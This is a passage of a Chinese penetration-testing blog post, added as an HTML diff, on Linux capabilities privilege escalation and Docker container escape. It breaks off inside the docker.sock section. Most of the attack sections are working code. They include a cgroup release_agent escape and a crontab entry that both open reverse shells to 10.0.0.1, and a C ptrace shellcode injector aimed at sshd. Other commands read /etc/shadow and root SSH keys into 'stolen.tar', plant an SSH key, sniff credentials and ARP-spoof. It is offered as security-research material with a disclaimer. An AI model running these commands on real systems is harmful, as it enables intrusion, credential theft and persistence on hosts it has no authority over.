@@ -1,0 +1,474 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 8.1.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"congliang.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="前言Linux Capabilities 将 root 超级权限拆分为细粒度能力单元，本意是实现最小权限原则。但在实际渗透中，错误配置的 Capabilities 和容器环境往往成为提权的捷径。本文系统梳理基于 Capabilities 的本地提权手法，以及 Docker 环境下的四种经典容器逃逸路径。  免责声明：本文所述技术仅供安全研究与授权测试使用。未经授权对他人系统进行测试属于违法行为，作">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux提权：Capabilities与容器逃逸">
+<meta property="og:url" content="https://congliang.github.io/Linux-privesc-capabilities-docker/">
+<meta property="og:site_name" content="渗透测试实战记录">
+<meta property="og:description" content="前言Linux Capabilities 将 root 超级权限拆分为细粒度能力单元，本意是实现最小权限原则。但在实际渗透中，错误配置的 Capabilities 和容器环境往往成为提权的捷径。本文系统梳理基于 Capabilities 的本地提权手法，以及 Docker 环境下的四种经典容器逃逸路径。  免责声明：本文所述技术仅供安全研究与授权测试使用。未经授权对他人系统进行测试属于违法行为，作">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-10-15T00:00:00.000Z">
+<meta property="article:modified_time" content="2026-06-04T15:34:45.923Z">
+<meta property="article:author" content="YunShang">
+<meta property="article:tag" content="云安全">
+<meta property="article:tag" content="权限提升">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://congliang.github.io/Linux-privesc-capabilities-docker/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://congliang.github.io/Linux-privesc-capabilities-docker/","path":"Linux-privesc-capabilities-docker/","title":"Linux提权：Capabilities与容器逃逸"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Linux提权：Capabilities与容器逃逸 | 渗透测试实战记录</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.10.1/mermaid.min.js","integrity":"sha256-BmQmdWDS8X2OTbrwELWK366LV6escyWhHHe0XCTU/Hk="}}</script>
+  <script src="/js/third-party/tags/mermaid.js" defer></script>
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">渗透测试实战记录</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">边学边记</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81Capabilities-%E5%9F%BA%E7%A1%80"><span class="nav-number">2.</span> <span class="nav-text">一、Capabilities 基础</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81getcap-%E6%9E%9A%E4%B8%BE"><span class="nav-number">3.</span> <span class="nav-text">二、getcap 枚举</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81Capabilities-%E6%8F%90%E6%9D%83%E5%AE%9E%E6%88%98"><span class="nav-number">4.</span> <span class="nav-text">三、Capabilities 提权实战</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-cap-sys-admin"><span class="nav-number">4.1.</span> <span class="nav-text">3.1 cap_sys_admin</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-cap-sys-ptrace"><span class="nav-number">4.2.</span> <span class="nav-text">3.2 cap_sys_ptrace</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-3-cap-dac-read-search"><span class="nav-number">4.3.</span> <span class="nav-text">3.3 cap_dac_read_search</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-4-cap-net-raw"><span class="nav-number">4.4.</span> <span class="nav-text">3.4 cap_net_raw</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E3%80%81Docker-%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8"><span class="nav-number">5.</span> <span class="nav-text">四、Docker 容器逃逸</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#4-1-%E2%80%93privileged-%E6%A8%A1%E5%BC%8F%E9%80%83%E9%80%B8"><span class="nav-number">5.1.</span> <span class="nav-text">4.1 –privileged 模式逃逸</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-2-docker-sock-%E6%8C%82%E8%BD%BD%E9%80%83%E9%80%B8"><span class="nav-number">5.2.</span> <span class="nav-text">4.2 docker.sock 挂载逃逸</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-3-cgroup-release-agent-%E9%80%83%E9%80%B8"><span class="nav-number">5.3.</span> <span class="nav-text">4.3 cgroup release_agent 逃逸</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-4-proc-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E6%8C%82%E8%BD%BD%E9%80%83%E9%80%B8"><span class="nav-number">5.4.</span> <span class="nav-text">4.4 &#x2F;proc 文件系统挂载逃逸</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94%E3%80%81%E6%A3%80%E6%B5%8B%E4%B8%8E%E9%98%B2%E5%BE%A1"><span class="nav-number">6.</span> <span class="nav-text">五、检测与防御</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A3%80%E6%B5%8B%E5%91%BD%E4%BB%A4"><span class="nav-number">6.1.</span> <span class="nav-text">检测命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE"><span class="nav-number">6.2.</span> <span class="nav-text">防御建议</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AD%E3%80%81%E6%80%BB%E7%BB%93"><span class="nav-number">7.</span> <span class="nav-text">六、总结</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">YunShang</p>
+  <div class="site-description" itemprop="description">渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">127</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/congliang" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;congliang" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:yunshang0069@126.com" title="E-Mail → mailto:yunshang0069@126.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://congliang.github.io/Linux-privesc-capabilities-docker/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="YunShang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试实战记录">
+      <meta itemprop="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Linux提权：Capabilities与容器逃逸 | 渗透测试实战记录">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Linux提权：Capabilities与容器逃逸
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2024-10-15 08:00:00" itemprop="dateCreated datePublished" datetime="2024-10-15T08:00:00+08:00">2024-10-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-06-04 23:34:45" itemprop="dateModified" datetime="2026-06-04T23:34:45+08:00">2026-06-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Linux Capabilities 将 root 超级权限拆分为细粒度能力单元，本意是实现最小权限原则。但在实际渗透中，错误配置的 Capabilities 和容器环境往往成为提权的捷径。本文系统梳理基于 Capabilities 的本地提权手法，以及 Docker 环境下的四种经典容器逃逸路径。</p>
+<blockquote>
+<p><strong>免责声明</strong>：本文所述技术仅供安全研究与授权测试使用。未经授权对他人系统进行测试属于违法行为，作者不承担任何法律责任。</p>
+</blockquote>
+<h2 id="一、Capabilities-基础"><a href="#一、Capabilities-基础" class="headerlink" title="一、Capabilities 基础"></a>一、Capabilities 基础</h2><p>Linux 将传统 root 权限划分为 40 余种独立能力，关键概念：</p>
+<table>
+<thead>
+<tr>
+<th>概念</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Permitted Set</td>
+<td>进程允许使用的能力集合</td>
+</tr>
+<tr>
+<td>Effective Set</td>
+<td>当前实际生效的能力（内核检查此集合）</td>
+</tr>
+<tr>
+<td>Bounding Set</td>
+<td>进程所能拥有的能力上限</td>
+</tr>
+<tr>
+<td>Ambient Set</td>
+<td>非特权程序 execve 后仍能保留的能力（Linux 4.3+）</td>
+</tr>
+</tbody></table>
+<p>文件可通过 <code>setcap</code> 附加能力，存储在扩展属性中：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">getcap</span> -r / 2&gt;/dev/null</span><br><span class="line">/usr/bin/python3.8 cap_setuid+ep</span><br><span class="line">/usr/bin/ping cap_net_raw+ep</span><br></pre></td></tr></table></figure>
+
+<h2 id="二、getcap-枚举"><a href="#二、getcap-枚举" class="headerlink" title="二、getcap 枚举"></a>二、getcap 枚举</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 递归搜索所有具备文件 Capabilities 的可执行文件</span></span><br><span class="line"><span class="built_in">getcap</span> -r / 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line"><span class="comment"># 筛选高危 Capabilities</span></span><br><span class="line"><span class="built_in">getcap</span> -r / 2&gt;/dev/null | grep -E <span class="string">&#x27;cap_sys_admin|cap_sys_ptrace|cap_dac_read_search|cap_setuid|cap_net_raw|cap_sys_module&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查进程 Capabilities</span></span><br><span class="line"><span class="built_in">cat</span> /proc/self/status | grep Cap</span><br><span class="line">capsh --<span class="built_in">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 自动化工具</span></span><br><span class="line">linpeas.sh  <span class="comment"># https://github.com/peass-ng/PEASS-ng</span></span><br><span class="line">linux-exploit-suggester-2 --capabilities</span><br></pre></td></tr></table></figure>
+
+<p>高危 Capabilities 速查：</p>
+<table>
+<thead>
+<tr>
+<th>Capability</th>
+<th>风险</th>
+<th>提权路径</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>cap_sys_admin</td>
+<td>严重</td>
+<td>挂载、namespace 操作</td>
+</tr>
+<tr>
+<td>cap_sys_ptrace</td>
+<td>严重</td>
+<td>注入任意进程内存</td>
+</tr>
+<tr>
+<td>cap_dac_read_search</td>
+<td>高</td>
+<td>绕过权限读取任意文件</td>
+</tr>
+<tr>
+<td>cap_setuid</td>
+<td>严重</td>
+<td>直接 setuid(0)</td>
+</tr>
+<tr>
+<td>cap_sys_module</td>
+<td>严重</td>
+<td>加载任意内核模块</td>
+</tr>
+<tr>
+<td>cap_net_raw</td>
+<td>中</td>
+<td>原始套接字、网络嗅探</td>
+</tr>
+</tbody></table>
+<h2 id="三、Capabilities-提权实战"><a href="#三、Capabilities-提权实战" class="headerlink" title="三、Capabilities 提权实战"></a>三、Capabilities 提权实战</h2><h3 id="3-1-cap-sys-admin"><a href="#3-1-cap-sys-admin" class="headerlink" title="3.1 cap_sys_admin"></a>3.1 cap_sys_admin</h3><p>最危险的 Capability 之一，涵盖挂载、namespace 操作等数十个子功能。</p>
+<p><strong>cgroup release_agent 提权</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p /tmp/cgrp &amp;&amp; mount -t cgroup -o memory cgroup /tmp/cgrp</span><br><span class="line"><span class="built_in">mkdir</span> -p /tmp/cgrp/x</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /tmp/cgrp/x/notify_on_release</span><br><span class="line">host_path=$(sed -n <span class="string">&#x27;s/.*\perdir=\([^,]*\).*/\1/p&#x27;</span> /etc/mtab)</span><br><span class="line"><span class="comment"># 写入 payload 到容器可访问路径（宿主机视角）</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;#!/bin/sh&#x27;</span> &gt; /release_payload</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444 0&gt;&amp;1&#x27;</span> &gt;&gt; /release_payload</span><br><span class="line"><span class="built_in">chmod</span> +x /release_payload</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$host_path</span>/release_payload&quot;</span> &gt; /tmp/cgrp/release_agent</span><br><span class="line">sh -c <span class="string">&quot;echo \$\$ &gt; /tmp/cgrp/x/cgroup.procs&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>挂载宿主机磁盘</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 容器内利用 cap_sys_admin 挂载宿主机根分区</span></span><br><span class="line">fdisk -l</span><br><span class="line">mount /dev/sda1 /mnt/host</span><br><span class="line"><span class="built_in">chroot</span> /mnt/host /bin/bash</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-2-cap-sys-ptrace"><a href="#3-2-cap-sys-ptrace" class="headerlink" title="3.2 cap_sys_ptrace"></a>3.2 cap_sys_ptrace</h3><p>允许 ptrace 调试任意进程，可直接注入代码到 root 进程：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 编译 ptrace 注入工具</span></span><br><span class="line"><span class="built_in">cat</span> &gt; ptrace_inject.c &lt;&lt; <span class="string">&#x27;EOF&#x27;</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/ptrace.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/user.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/wait.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv) &#123;</span><br><span class="line">    pid_t target = atoi(argv[1]);</span><br><span class="line">    char shellcode[] = <span class="string">&quot;\x48\x31\xc0\x48\xbb\x2f\x62\x69\x6e\x2f&quot;</span></span><br><span class="line">                       <span class="string">&quot;\x73\x68\x00\x53\x48\x89\xe7\x48\x31\xf6&quot;</span></span><br><span class="line">                       <span class="string">&quot;\x48\x31\xd2\xb8\x3b\x00\x00\x00\x0f\x05&quot;</span>;</span><br><span class="line">    struct user_regs_struct regs, saved;</span><br><span class="line">    unsigned long sc_addr;</span><br><span class="line"></span><br><span class="line">    ptrace(PTRACE_ATTACH, target, NULL, NULL);</span><br><span class="line">    <span class="built_in">wait</span>(NULL);</span><br><span class="line">    ptrace(PTRACE_GETREGS, target, NULL, &amp;regs);</span><br><span class="line">    memcpy(&amp;saved, &amp;regs, sizeof(regs));</span><br><span class="line"></span><br><span class="line">    sc_addr = regs.rsp - 1024;</span><br><span class="line">    <span class="keyword">for</span> (int i = 0; i &lt; sizeof(shellcode); i += 8)</span><br><span class="line">        ptrace(PTRACE_POKEDATA, target, sc_addr + i,</span><br><span class="line">               *(unsigned long *)(shellcode + i));</span><br><span class="line"></span><br><span class="line">    regs.rip = sc_addr;</span><br><span class="line">    ptrace(PTRACE_SETREGS, target, NULL, &amp;regs);</span><br><span class="line">    ptrace(PTRACE_DETACH, target, NULL, NULL);</span><br><span class="line">    <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">gcc -o ptrace_inject ptrace_inject.c</span><br><span class="line">./ptrace_inject $(pgrep -f <span class="string">&quot;sshd&quot;</span> | <span class="built_in">head</span> -1)</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-3-cap-dac-read-search"><a href="#3-3-cap-dac-read-search" class="headerlink" title="3.3 cap_dac_read_search"></a>3.3 cap_dac_read_search</h3><p>绕过所有文件读取权限检查，直接读取敏感文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Python 读取 shadow</span></span><br><span class="line">python3 -c <span class="string">&quot;</span></span><br><span class="line"><span class="string">with open(&#x27;/etc/shadow&#x27;, &#x27;r&#x27;) as f:</span></span><br><span class="line"><span class="string">    print(f.read())</span></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line"><span class="comment"># 读取 root SSH 私钥</span></span><br><span class="line">python3 -c <span class="string">&quot;print(open(&#x27;/root/.ssh/id_rsa&#x27;).read())&quot;</span></span><br><span class="line"><span class="comment"># 打包敏感文件</span></span><br><span class="line">tar -cvf /tmp/stolen.tar /etc/shadow /root/.ssh/</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-4-cap-net-raw"><a href="#3-4-cap-net-raw" class="headerlink" title="3.4 cap_net_raw"></a>3.4 cap_net_raw</h3><p>允许创建原始套接字，用于网络嗅探和中间人攻击：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i eth0 -w /tmp/capture.pcap</span><br><span class="line">tcpdump -i eth0 -A | grep -iE <span class="string">&quot;password|token|auth&quot;</span></span><br><span class="line">arpspoof -i eth0 -t 192.168.1.1 192.168.1.100</span><br></pre></td></tr></table></figure>
+
+<h2 id="四、Docker-容器逃逸"><a href="#四、Docker-容器逃逸" class="headerlink" title="四、Docker 容器逃逸"></a>四、Docker 容器逃逸</h2><h3 id="4-1-–privileged-模式逃逸"><a href="#4-1-–privileged-模式逃逸" class="headerlink" title="4.1 –privileged 模式逃逸"></a>4.1 –privileged 模式逃逸</h3><p><code>--privileged</code> 赋予容器几乎所有 Capabilities 并解除设备 cgroup 限制：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 检测是否为 privileged 模式</span></span><br><span class="line"><span class="built_in">cat</span> /proc/self/status | grep CapEff</span><br><span class="line">fdisk -l 2&gt;/dev/null    <span class="comment"># 能看到宿主机磁盘即为 privileged</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 逃逸步骤</span></span><br><span class="line">fdisk -l                          <span class="comment"># 确认宿主机磁盘 /dev/sda1</span></span><br><span class="line"><span class="built_in">mkdir</span> -p /mnt/host</span><br><span class="line">mount /dev/sda1 /mnt/host</span><br><span class="line"><span class="built_in">chroot</span> /mnt/host /bin/bash</span><br><span class="line"><span class="comment"># 写 crontab 反弹 shell</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;* * * * * root bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.0.0.1/5555 0&gt;&amp;1&quot;&#x27;</span> \</span><br><span class="line">    &gt;&gt; /mnt/host/etc/crontab</span><br><span class="line"><span class="comment"># 或添加 SSH 公钥</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ssh-rsa AAA...&quot;</span> &gt;&gt; /mnt/host/root/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-2-docker-sock-挂载逃逸"><a href="#4-2-docker-sock-挂载逃逸" class="headerlink" title="4.2 docker.sock 挂载逃逸"></a>4.2 docker.sock 挂载逃逸</h3><p>宿主机 <code>/var/run/docker.sock</code> 被挂载进容器后，容器可操控宿主机 Docker 守护进程：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 检测</span></span><br><span class="line"><span class="built_in">ls</span> -la /var/run/docker.sock</span><br><span class="line">curl --unix-socket /var/run/docker.sock http://localhost/version</span><br><span class="line"></span><br><span class="line"><span class="comment"># 手法一：启动新容器挂载宿主机根文件系统</span></span><br><span class="line">docker -H unix:///var/run/docker.sock run -it -v /:/host alpine <span class="built_in">chroot</span> /host /bin/sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># 手法二：以 privileged + host PID 启动新容器</span></span><br><span class="line">docker -H unix:///var/run/docker.sock run -it --privileged --pid=host \</span><br><span class="line">    alpine nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># 手法三：通过 Docker API 创建容器</span></span><br><span class="line"><span class="built_in">cat</span> &gt; container.json &lt;&lt; <span class="string">EOF</span></span><br><span class="line"><span class="string">&#123;&quot;Image&quot;:&quot;alpine&quot;,&quot;Cmd&quot;:[&quot;/bin/sh&quot;,&quot;-c&quot;,&quot;chroot /mnt/host /bin/sh&quot;],</span></span><br><span class="line"><span class="string"> &quot;HostConfig&quot;:&#123;&quot;Binds&quot;:[&quot;/:/mnt/host&quot;]&#125;,&quot;SecurityOpt&quot;:[&quot;apparmor=unconfined&quot;]&#125;</span></span><br><span class="line"><span 